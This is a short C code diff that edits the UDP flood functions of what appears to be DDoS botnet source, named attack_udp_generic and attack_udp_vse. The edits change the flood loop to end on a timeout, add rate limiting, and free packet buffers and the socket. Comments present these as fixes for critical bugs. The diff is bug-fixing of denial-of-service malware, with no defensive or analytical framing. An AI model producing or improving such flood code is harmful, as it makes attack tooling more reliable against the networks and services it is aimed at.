@@ -82,7 +82,8 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
         udph->len = htons(sizeof (struct udphdr) + data_len);
     }
 
-    while (TRUE)
+    /* FIXED: Changed from while(TRUE) to check timeout - Bug CRIT-3 */
+    while (attack_should_continue())
     {
         for (i = 0; i < targs_len; i++)
         {
@@ -123,7 +124,16 @@ void attack_udp_generic(uint8_t targs_len, struct attack_target *targs, uint8_t 
             if (errno != 0)
                 printf("errno = %d\n", errno);
 #endif
+        /* Rate limiting to prevent 100% CPU - Bug CRIT-3 fix */
+        usleep(100);
     }
+    
+    /* FIXED: Cleanup to prevent memory leak - Bug CRIT-4 */
+    for (i = 0; i < targs_len; i++) {
+        if (pkts[i]) free(pkts[i]);
+    }
+    free(pkts);
+    close(fd);
 }
 
 void attack_udp_vse(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
